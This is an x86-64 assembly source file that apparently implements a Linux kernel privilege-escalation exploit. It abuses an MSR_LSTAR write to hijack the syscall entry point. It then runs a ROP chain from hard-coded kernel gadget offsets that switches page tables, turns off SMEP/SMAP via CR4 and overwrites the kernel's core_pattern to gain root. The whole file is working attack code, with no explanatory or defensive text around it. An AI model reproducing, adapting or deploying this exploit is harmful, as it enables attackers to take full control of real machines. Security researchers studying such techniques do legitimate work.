.set MSR_LSTAR, 0xc0000082

// Gadget offsets
.set MOV_CR3_RAX, 0x801745
.set MOV_CR4_RBX, 0x5df18a
.set POP_RBX, 0xebfa9
.set POP_RDX, 0x395756
.set OR_CR3_IRETQ, 0x80158b
.set POP_RAX, 0x3959b5
.set POP_RCX, 0x39585c
.set POP_R11, 0x395709
.set MOV_AT_RDX_AL, 0x1afd29

// Symbols offets
.set CORE_PATTERN, 0xf5dd00
.set ORIGINAL_MSR_LSTAR, 0x800040

.text
    .globl stac
    .globl pwn
    .globl wrmsr_sysretq

// This is executed with CPL=0
wrmsr_sysretq:
    // we reuse r8 that contains iretq gagde address
    subq $POP_RDX, %r8
    movq %r8, %rax
    addq $ORIGINAL_MSR_LSTAR, %rax
    mov $0xffffffff, %edx
    movq $MSR_LSTAR, %rcx
    // Write the value in EDX:EAX to MSR specified by ECX
    wrmsr
    movq $return, %rcx
    sysretq

// Stac instruction equivalent: set EFLAGS.AC
stac:
    pushfq
    popq %rax
    or $0x40000, %rax
    pushq %rax
    popfq
    ret

// The ROP chain will be executed when calling syscall.
// since no RSP changes occurs when calling syscall, the kernel
// code will use user-provided RSP.
pwn:
    pushq %rbp
    movq %rsp, %rbp
    pushq %rdi
    pushq %rsi
    pushq %rdx
    pushq %rcx

    // MSR_LSTAR new value
    // cr3 &= 0x1000: set kernel page table in cr3 to access further gadgets
    movq -0x10(%rbp), %rax
    addq $MOV_CR3_RAX, %rax
    pushq %rax

    movq $MSR_LSTAR, %rcx
    movq $8, %rdx
    lea -0x28(%rbp), %rsi
    movq -8(%rbp), %rdi
    call wrmsr

    call stac

    // start pushing ROP chain

    // iretq frame
    // ss
    pushq $0x18
    // rsp
    movq %rsp, %rcx
    add $8, %rcx
    pushq %rcx
    // rflags
    pushq $0x46
    // cs
    pushq $0x10
    // rip
    movq $wrmsr_sysretq, %rcx
    pushq %rcx
    // error code is not popped by iretq, no need to push a fake one

    // dummy push
    pushq $0
    pushq $0

    movq -0x10(%rbp), %rcx
    addq $OR_CR3_IRETQ, %rcx
    pushq %rcx

    // rflags
    pushq $0x82
    movq -0x10(%rbp), %rcx
    addq $POP_R11, %rcx
    pushq %rcx

    // overwrite core_pattern
    movq -0x10(%rbp), %rcx
    addq $MOV_AT_RDX_AL, %rcx
    pushq %rcx

    // popped rax
    movq -0x20(%rbp), %rcx
    // shlq $8, %rcx
    pushq %rcx

    movq -0x10(%rbp), %rcx
    addq $POP_RAX, %rcx
    pushq %rcx

    // core_pattern addres
    movq -0x10(%rbp), %rcx
    addq $CORE_PATTERN, %rcx
    addq -0x18(%rbp), %rcx
    pushq %rcx

    // turn off SMEP
    movq -0x10(%rbp), %rcx
    addq $POP_RDX, %rcx
    movq %rcx, %r8
    movq -0x10(%rbp), %rcx
    addq $MOV_CR4_RBX, %rcx
    push %rcx

    pushq $0
    movq -0x10(%rbp), %rcx
    add $POP_RDX, %rcx
    push %rcx

    pushq $0x6f0
    movq -0x10(%rbp), %rcx
    add $POP_RBX, %rcx
    push %rcx

    // Trigger
    syscall

return:
    add $0x30, %rsp
    movq %rbp, %rsp
    popq %rbp
    ret
